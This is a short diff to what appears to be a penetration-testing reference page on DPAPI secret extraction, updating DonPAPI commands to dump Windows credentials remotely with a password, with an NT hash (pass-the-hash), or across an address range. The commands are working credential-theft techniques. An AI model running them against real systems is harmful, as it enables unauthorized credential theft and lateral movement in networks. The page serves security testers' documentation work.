@@ -46,7 +46,12 @@ dpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY
 [DonPAPI](https://github.com/login-securite/DonPAPI) (Python) can also be used to remotely extract a user's DPAPI secrets more easily. It supports [pass-the-hash](../../ntlm/pth.md), [pass-the-ticket](../../kerberos/ptt.md) and so on.
 
 ```bash
-DonPAPI.py 'domain'/'username':'password'@<'targetName' or 'address/mask'>
+# With cleartext credentials
+DonPAPI collect -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -t "$TARGET"
+# With Pass-the-Hash
+DonPAPI collect -u "$USER" -H ":$NT_HASH" -d "$DOMAIN" -t "$TARGET"
+# On a range
+DonPAPI collect -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -t "$RANGE"
 ```
 
 
